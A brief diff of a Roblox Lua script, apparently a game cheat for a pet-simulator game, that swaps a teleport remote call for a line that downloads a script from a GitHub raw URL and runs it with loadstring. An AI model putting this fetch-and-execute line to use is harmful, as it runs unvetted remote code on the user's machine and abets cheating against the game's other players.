@@ -9,4 +9,4 @@ end
 _G.SCRIPT1 = true
 
 -- Script của bạn
-game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("World1Teleport"):InvokeServer()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/Pet99pro/main/Daycare"))()
